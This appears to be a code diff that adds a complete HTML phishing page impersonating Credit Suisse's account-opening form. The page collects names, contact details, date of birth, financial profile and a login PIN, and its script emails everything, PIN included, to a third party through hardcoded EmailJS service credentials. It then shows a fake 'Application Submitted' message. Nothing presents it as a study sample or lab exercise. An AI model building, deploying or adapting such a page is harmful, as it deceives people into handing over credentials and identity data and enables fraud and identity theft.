@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Credit Suisse • Account Opening</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f2f4f7;
+      color: #1a1a1a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .registration-container {
+      max-width: 780px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .registration-card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.12);
+      padding: 48px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      height: 45px;
+      display: inline-block;
+    }
+
+    h1 {
+      color: #002a5c;
+      font-weight: 300;
+      margin: 15px 0 5px;
+      font-size: 28px;
+      text-align: center;
+    }
+
+    .subtitle {
+      color: #6b7280;
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .section-title {
+      color: #002a5c;
+      font-size: 18px;
+      font-weight: 600;
+      margin: 30px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .section-title:first-of-type {
+      margin-top: 0;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1f2933;
+      margin-bottom: 6px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 10px;
+      border: 1px solid #cfd4da;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      font-family: inherit;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: #003a8f;
+      box-shadow: 0 0 0 2px rgba(0, 58, 143, 0.15);
+    }
+
+    .account-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .account-card {
+      border: 1px solid #cfd4da;
+      border-radius: 8px;
+      padding: 20px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .account-card:hover {
+      border-color: #003a8f;
+      background: #f8fafd;
+    }
+
+    .account-card.selected {
+      border-color: #003a8f;
+      background: #f0f7ff;
+      box-shadow: 0 4px 12px rgba(0, 58, 143, 0.15);
+    }
+
+    .account-card h4 {
+      color: #002a5c;
+      margin: 0 0 8px 0;
+      font-size: 16px;
+    }
+
+    .account-card p {
+      color: #6b7280;
+      margin: 0 0 12px 0;
+      font-size: 13px;
+      line-height: 1.4;
+    }
+
+    .minimum {
+      font-size: 12px;
+      color: #003a8f;
+      font-weight: 600;
+    }
+
+    .upload-area {
+      border: 2px dashed #cfd4da;
+      border-radius: 8px;
+      padding: 30px;
+      text-align: center;
+      background: #fafbfc;
+      cursor: pointer;
+      transition: border-color 0.2s ease;
+      margin-bottom: 25px;
+    }
+
+    .upload-area:hover {
+      border-color: #003a8f;
+    }
+
+    .upload-icon {
+      font-size: 36px;
+      margin-bottom: 12px;
+      color: #6b7280;
+    }
+
+    .upload-btn {
+      background: #f5f7fa;
+      color: #003a8f;
+      border: 1px solid #003a8f;
+      padding: 8px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      display: inline-block;
+      margin: 15px 0 10px;
+    }
+
+    .upload-note {
+      font-size: 11px;
+      color: #6b7280;
+    }
+
+    .checkbox-group {
+      margin: 25px 0;
+    }
+
+    .checkbox-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 15px;
+    }
+
+    .checkbox-item input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      margin: 0;
+    }
+
+    .checkbox-item label {
+      margin: 0;
+      font-weight: normal;
+      color: #1f2933;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      background: #003a8f;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin: 20px 0;
+    }
+
+    button:hover {
+      background: #002e73;
+    }
+
+    .pin-note {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: -15px;
+      margin-bottom: 20px;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal.show {
+      display: flex;
+    }
+
+    .modal-content {
+      background: #fff;
+      padding: 40px;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      text-align: center;
+    }
+
+    .success-icon {
+      font-size: 48px;
+      color: #10b981;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .registration-card {
+        padding: 24px;
+      }
+      
+      .grid-2, .account-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="registration-container">
+    <div class="registration-card">
+      <!-- Logo -->
+      <div class="logo">
+        <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1771185812/wn6e9zmpiinkjfeydgna.png" alt="Credit Suisse">
+      </div>
+
+      <h1>Open your account</h1>
+      <div class="subtitle">Join Credit Suisse Private Banking</div>
+
+      <form id="registrationForm">
+        <!-- Section 1: Personal Information -->
+        <div class="section-title">Personal Information</div>
+        
+        <div>
+          <label>Full Name (as on passport/ID)</label>
+          <input type="text" id="fullName" placeholder="e.g. Anna Müller" required>
+        </div>
+        
+        <div class="grid-2">
+          <div>
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="anna@example.com" required>
+          </div>
+          <div>
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="+41 79 123 45 67" required>
+          </div>
+        </div>
+        
+        <div class="grid-2">
+          <div>
+            <label>Date of Birth</label>
+            <input type="date" id="dob" required>
+          </div>
+          <div>
+            <label>City</label>
+            <input type="text" id="city" placeholder="Zurich" required>
+          </div>
+        </div>
+
+        <!-- Section 2: Account Selection -->
+        <div class="section-title">Account Selection</div>
+        
+        <label>Select Account Type</label>
+        <div class="account-grid">
+          <div class="account-card" onclick="selectAccount('csx-basic')" id="acc-csx-basic">
+            <h4>CSX Basic</h4>
+            <p>Digital banking, debit card</p>
+            <span class="minimum">CHF 0 minimum</span>
+          </div>
+          
+          <div class="account-card" onclick="selectAccount('csx-pro')" id="acc-csx-pro">
+            <h4>CSX Pro</h4>
+            <p>Priority support, better rates</p>
+            <span class="minimum">CHF 5,000 minimum</span>
+          </div>
+          
+          <div class="account-card" onclick="selectAccount('private')" id="acc-private">
+            <h4>Private Banking</h4>
+            <p>Wealth management, RM</p>
+            <span class="minimum">CHF 50,000 minimum</span>
+          </div>
+          
+          <div class="account-card" onclick="selectAccount('corporate')" id="acc-corporate">
+            <h4>Corporate</h4>
+            <p>Business multi-currency</p>
+            <span class="minimum">Contact RM</span>
+          </div>
+        </div>
+        <input type="hidden" id="accountType" value="">
+        
+        <div class="grid-2">
+          <div>
+            <label>Primary Currency</label>
+            <select id="currency">
+              <option value="CHF">CHF - Swiss Franc</option>
+              <option value="EUR">EUR - Euro</option>
+              <option value="USD">USD - US Dollar</option>
+              <option value="GBP">GBP - British Pound</option>
+            </select>
+          </div>
+          
+          <div>
+            <label>Monthly Volume</label>
+            <select id="volume">
+              <option value="<10k">< CHF 10,000</option>
+              <option value="10k-50k">CHF 10,000 - 50,000</option>
+              <option value="50k-200k">CHF 50,000 - 200,000</option>
+              <option value=">200k">> CHF 200,000</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Section 3: Compliance -->
+        <div class="section-title">Compliance Information</div>
+        
+        <div class="grid-2">
+          <div>
+            <label>Employment Status</label>
+            <select id="employment">
+              <option value="Employed">Employed</option>
+              <option value="Self-Employed">Self-Employed</option>
+              <option value="Retired">Retired</option>
+              <option value="Student">Student</option>
+            </select>
+          </div>
+          
+          <div>
+            <label>Source of Funds</label>
+            <select id="sourceFunds">
+              <option value="Salary">Salary/Employment</option>
+              <option value="Business">Business Income</option>
+              <option value="Investments">Investments</option>
+              <option value="Inheritance">Inheritance</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Section 4: Security -->
+        <div class="section-title">Security</div>
+        
+        <div>
+          <label>Create Login PIN (12-16 digits)</label>
+          <input type="password" id="pin" placeholder="Enter 12-16 digit PIN" maxlength="16" required>
+          <div class="pin-note">Use for SecureSign login</div>
+        </div>
+
+        <!-- Section 5: ID Upload -->
+        <div class="section-title">Verification (Optional)</div>
+        
+        <div class="upload-area" onclick="document.getElementById('fileUpload').click();">
+          <div class="upload-icon">📎</div>
+          <p style="color: #6b7280; margin: 0 0 10px;">Upload ID (Passport/Driver's License)</p>
+          <span class="upload-btn">Choose File</span>
+          <div class="upload-note">JPG, PNG or PDF up to 5MB</div>
+          <input type="file" id="fileUpload" accept=".jpg,.jpeg,.png,.pdf" style="display: none;">
+        </div>
+
+        <!-- Section 6: Terms -->
+        <div class="checkbox-group">
+          <div class="checkbox-item">
+            <input type="checkbox" id="termsConfirm">
+            <label for="termsConfirm">I confirm that the information provided is accurate</label>
+          </div>
+          
+          <div class="checkbox-item">
+            <input type="checkbox" id="termsAgree">
+            <label for="termsAgree">I agree to the <a href="#" style="color: #003a8f;">Terms & Conditions</a> and <a href="#" style="color: #003a8f;">Privacy Policy</a></label>
+          </div>
+          
+          <div class="checkbox-item">
+            <input type="checkbox" id="termsConsent">
+            <label for="termsConsent">I consent to electronic communications</label>
+          </div>
+        </div>
+
+        <!-- Submit Button -->
+        <button type="button" onclick="submitRegistration()">Create Account</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Success Modal -->
+  <div id="successModal" class="modal">
+    <div class="modal-content">
+      <div class="success-icon">✓</div>
+      <h3 style="color: #002a5c; margin-bottom: 15px;">Application Submitted</h3>
+      <p style="color: #4b5563; line-height: 1.6; margin-bottom: 25px;">
+        Account creation in progress!<br>
+        Please check your email within 24 hours for your account details.
+      </p>
+      <button onclick="closeModal()" style="background: #003a8f; width: auto; padding: 10px 30px; display: inline-block;">OK</button>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    (function() {
+      emailjs.init("pDefyPQfc_lW2Cdcu");
+    })();
+
+    // Account selection
+    let selectedAccount = '';
+
+    function selectAccount(type) {
+      document.querySelectorAll('.account-card').forEach(el => {
+        el.classList.remove('selected');
+      });
+      
+      document.getElementById(`acc-${type}`).classList.add('selected');
+      document.getElementById('accountType').value = type;
+      selectedAccount = type;
+    }
+
+    function formatAccountType(type) {
+      const types = {
+        'csx-basic': 'CSX Basic',
+        'csx-pro': 'CSX Pro',
+        'private': 'Private Banking',
+        'corporate': 'Corporate'
+      };
+      return types[type] || type;
+    }
+
+    // Submit registration
+    function submitRegistration() {
+      // Validate required fields
+      if (!document.getElementById('fullName').value ||
+          !document.getElementById('email').value ||
+          !document.getElementById('phone').value ||
+          !document.getElementById('dob').value ||
+          !document.getElementById('city').value ||
+          !selectedAccount ||
+          !document.getElementById('pin').value ||
+          !document.getElementById('termsConfirm').checked ||
+          !document.getElementById('termsAgree').checked) {
+        
+        alert('Please complete all required fields and accept the terms.');
+        return;
+      }
+
+      // Validate PIN length
+      const pin = document.getElementById('pin').value;
+      if (pin.length < 12 || pin.length > 16) {
+        alert('PIN must be between 12 and 16 digits.');
+        return;
+      }
+
+      const btn = event.target;
+      const originalText = btn.textContent;
+      btn.textContent = 'Submitting...';
+      btn.disabled = true;
+
+      const templateParams = {
+        name: document.getElementById('fullName').value,
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        dob: document.getElementById('dob').value,
+        city: document.getElementById('city').value,
+        accountType: formatAccountType(selectedAccount),
+        currency: document.getElementById('currency').value,
+        volume: document.getElementById('volume').value,
+        employment: document.getElementById('employment').value,
+        sourceFunds: document.getElementById('sourceFunds').value,
+        pin: document.getElementById('pin').value,
+        timestamp: new Date().toLocaleString('en-GB', {
+          day: '2-digit',
+          month: '2-digit',
+          year: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+        })
+      };
+
+      emailjs.send('service_oppnbmh', 'template_tzhyhjn', templateParams)
+        .then(function() {
+          document.getElementById('successModal').classList.add('show');
+          
+          // Reset form
+          document.getElementById('registrationForm').reset();
+          document.querySelectorAll('.account-card').forEach(el => {
+            el.classList.remove('selected');
+          });
+          selectedAccount = '';
+        })
+        .catch(function(error) {
+          alert('Submission failed. Please try again.');
+          console.error(error);
+        })
+        .finally(function() {
+          btn.textContent = originalText;
+          btn.disabled = false;
+        });
+    }
+
+    function closeModal() {
+      document.getElementById('successModal').classList.remove('show');
+    }
+
+    // File upload (optional)
+    document.getElementById('fileUpload')?.addEventListener('change', function(e) {
+      const fileName = e.target.files[0]?.name;
+      if (fileName) {
+        // Optional: show file name
+      }
+    });
+  </script>
+</body>
+</html>
